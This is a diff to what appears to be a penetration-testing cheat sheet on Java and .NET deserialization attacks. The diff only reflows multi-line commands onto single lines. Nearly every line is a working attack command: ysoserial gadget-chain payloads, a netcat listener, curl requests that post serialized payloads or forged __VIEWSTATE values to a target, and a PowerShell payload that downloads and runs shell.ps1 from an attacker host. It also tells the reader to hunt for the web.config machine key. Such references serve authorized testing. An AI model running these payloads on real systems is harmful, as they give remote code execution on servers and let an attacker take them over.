@@ -59,9 +59,7 @@ java -jar ysoserial-all.jar CommonsCollections6 "bash -c {echo,${B64}}|{base64,-
 ```bash
 # Send as raw POST body
 nc -lvnp 4444 &
-curl -s -X POST "http://<target>/deserialize" \
-  -H "Content-Type: application/x-java-serialized-object" \
-  --data-binary @payload.ser
+curl -s -X POST "http://<target>/deserialize" -H "Content-Type: application/x-java-serialized-object" --data-binary @payload.ser
 
 # Send in cookie (Apache Shiro rememberMe, etc.)
 PAYLOAD=$(java -jar ysoserial-all.jar CommonsCollections6 'id' | base64 -w 0)
@@ -247,21 +245,16 @@ mono ysoserial.exe -h
 mono ysoserial.exe -l   # list all gadgets + formatters
 
 # Generate payload for ViewState (BinaryFormatter)
-mono ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter \
-  -c "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(\"http://<attacker-ip>/shell.ps1\")'"
+mono ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(\"http://<attacker-ip>/shell.ps1\")'"
 
 # ViewState specific (no MAC key — old IIS)
-mono ysoserial.exe -g ActivitySurrogateSelector -f LosFormatter \
-  -c "cmd /c whoami > C:\inetpub\wwwroot\out.txt"
+mono ysoserial.exe -g ActivitySurrogateSelector -f LosFormatter -c "cmd /c whoami > C:\inetpub\wwwroot\out.txt"
 
 # With MAC key known
-mono ysoserial.exe -g TextFormattingRunProperties -f ViewState \
-  --validationkey=<key> --validationalg=SHA1 \
-  -c "cmd /c whoami"
+mono ysoserial.exe -g TextFormattingRunProperties -f ViewState --validationkey=<key> --validationalg=SHA1 -c "cmd /c whoami"
 
 # Json.NET gadget (common in APIs)
-mono ysoserial.exe -g ObjectDataProvider -f Json.Net \
-  -c "cmd /c whoami"
+mono ysoserial.exe -g ObjectDataProvider -f Json.Net -c "cmd /c whoami"
 
 # Common .NET chains: TypeConfuseDelegate, ObjectDataProvider, ActivitySurrogateSelector
 ```
@@ -273,12 +266,10 @@ mono ysoserial.exe -g ObjectDataProvider -f Json.Net \
 # Try modifying any byte in ViewState — if no "Validation of viewstate MAC failed" → MAC disabled
 
 # If MAC disabled — generate payload directly
-mono ysoserial.exe -g TypeConfuseDelegate -f LosFormatter \
-  -c "cmd /c whoami > C:\inetpub\wwwroot\pwned.txt" -o base64
+mono ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c "cmd /c whoami > C:\inetpub\wwwroot\pwned.txt" -o base64
 
 # Inject via __VIEWSTATE POST parameter
-curl -s -X POST "http://<target>/page.aspx" \
-  -d "__VIEWSTATE=<b64_payload>&__VIEWSTEATEGENERATOR=<value>&__EVENTTARGET=&__EVENTARGUMENT="
+curl -s -X POST "http://<target>/page.aspx" -d "__VIEWSTATE=<b64_payload>&__VIEWSTEATEGENERATOR=<value>&__EVENTTARGET=&__EVENTARGUMENT="
 
 # ViewState MAC key hunting:
 # web.config: <machineKey validationKey="..." decryptionKey="..."/>
